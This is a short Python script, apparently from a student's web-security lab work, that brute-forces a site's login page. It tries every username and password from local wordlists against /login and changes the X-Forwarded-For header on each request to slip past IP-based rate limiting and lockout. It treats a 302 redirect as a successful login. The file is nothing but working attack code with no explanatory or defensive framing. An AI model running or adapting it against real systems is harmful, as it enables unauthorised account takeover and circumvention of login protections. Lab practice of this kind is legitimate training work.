import requests
import sys
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8087", "https": "http://127.0.0.1:8087"}

def brute_force(url, userList, passList) :

    credentials = ""
    ite = 15 
    for user_ in userList:
        for pass_ in passList:
            data = {"username": user_, "password": pass_}
            headers = {"X-Forwarded-For":f"{ite}"}
            cookie = {"session":"vUPoy8YBFOw2Yu1P291Yc63aUHxz34JI"}
            res = requests.post(url + "/login", data=data, cookies=cookie, headers=headers, proxies=proxies, verify=False)
            ite += 1
            if res.status_code == 302:
                credentials += user_ + '   ' + pass_ + "\n"
                break
            else:
                sys.stdout.write("\r" + user_ + "    " + pass_)
                sys.stdout.flush()
        if credentials != "" :
            break      
         
    return credentials          

if __name__ == "__main__": 
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('(+) Usage : %s <url>' % sys.argv[0])
        print('(+) Example : %s www.example.com' % sys.argv[0])
        sys.exit(-1)
        
    userList = []
    passList = [] 
    # current_directory = os.getcwd()
    # print(current_directory)
    with open(r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\users.txt', "r", encoding="utf-8") as userFile:
        userList = userFile.read().splitlines()
        userFile.close()
        
    with open(r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\password.txt', "r", encoding="utf-8") as passFile:
        passList = passFile.read().splitlines()
        passFile.close()
        
    result = brute_force(url, userList, passList)
    
    print("The result is : ", end="\n")
    print(result)